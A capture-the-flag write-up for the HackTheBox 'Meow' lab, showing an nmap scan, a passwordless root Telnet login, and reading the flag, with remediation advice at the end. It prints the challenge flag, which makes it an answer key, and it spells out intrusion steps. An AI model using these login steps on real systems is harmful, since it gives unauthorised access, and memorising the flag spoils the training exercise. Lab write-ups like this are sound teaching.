# Meow — HackTheBox Starting Point Writeup

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9FEF00?logo=hackthebox&logoColor=black)
![Tier](https://img.shields.io/badge/Tier-0-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue?logo=linux&logoColor=white)
![Flags](https://img.shields.io/badge/Flags-1-orange)
![Foothold](https://img.shields.io/badge/Foothold-Telnet%20(23)-red)

> **Target:** `10.129.73.4`
> **Foothold:** Unauthenticated **Telnet** login as `root` with a blank password.

---

## 🧭 Overview

A single open **Telnet** service (`23/tcp`) allowed a direct login as **`root`** with a
**blank password**, dropping straight into a root shell. The flag was readable in `/root/`
— no privilege escalation required.

---

## 1. Reconnaissance

```bash
nmap 10.129.73.4
```

```text
PORT   STATE SERVICE
23/tcp open  telnet
```

Telnet is a cleartext remote-login protocol — an exposed Telnet service is a strong signal
of weak, default, or missing authentication.

---

## 2. Foothold — Telnet

```bash
telnet 10.129.73.4
```

At the `login:` prompt, entering **`root`** with **no password** gave an interactive shell:

```text
Meow login: root
root@Meow:~#
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## 3. Flag

```bash
cat /root/flag.txt
```

<details>
<summary>🚩 Click to reveal — FLAG</summary>

```text
b40abdfe23665f766f9c61ecba8a4c19
```
</details>

---

## 🛡️ Lessons / Remediation
- **Disable Telnet**; replace with **SSH** using key-based authentication.
- Never leave blank or default credentials on a remotely accessible service.
- Firewall and segment management services off the network edge.
